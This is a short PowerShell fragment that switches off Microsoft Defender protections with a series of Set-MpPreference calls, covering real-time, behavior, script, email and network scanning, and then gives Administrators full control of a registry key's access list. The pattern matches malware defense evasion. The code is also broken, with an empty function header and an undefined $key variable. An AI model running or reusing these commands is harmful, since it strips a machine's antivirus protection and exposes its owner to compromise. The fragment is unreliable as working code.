﻿function Remove-RegistryKey
Set-MpPreference -DisableAutoExclusions  $False
Set-MpPreference -DisableBehaviorMonitoring  $True
Set-MpPreference -DisableBlockAtFirstSeen  $False
Set-MpPreference -DisableCatchupFullScan  $True
Set-MpPreference -DisableCatchupQuickScan  $True
Set-MpPreference -DisableEmailScanning  $True
Set-MpPreference -DisableIntrusionPreventionSystem $True
Set-MpPreference -DisableIOAVProtection  $True
Set-MpPreference -DisablePrivacyMode  $False
Set-MpPreference -DisableRealtimeMonitoring  $True
Set-MpPreference -DisableRemovableDriveScanning $True
Set-MpPreference -DisableRestorePoint  $True
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan  $True
Set-MpPreference -DisableScanningNetworkFiles  $True
Set-MpPreference -DisableScriptScanning  $True
Set-MpPreference -ScanOnlyIfIdleEnabled  $True
$acl = $key.GetAccessControl()
$rule = New-Object System.Security.AccessControl.RegistryAccessRule ("Administrators","FullControl","Allow")
$acl.SetAccessRule($rule)
$key.SetAccessControl($acl)